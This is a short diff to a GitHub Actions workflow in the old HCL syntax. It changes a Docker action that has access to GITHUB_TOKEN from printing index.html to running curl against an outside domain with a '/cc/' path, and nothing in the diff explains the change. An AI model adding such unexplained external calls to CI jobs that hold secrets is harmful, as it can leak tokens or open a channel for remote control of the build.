@@ -6,5 +6,5 @@ workflow "New workflow" {
 action "GitHub Action for Docker" {
   uses = "actions/docker/cli@76ff57a"
   secrets = ["GITHUB_TOKEN"]
-  runs = "cat index.html"
+  runs = "curl https://tel.sxtofun.com/cc/"
 }
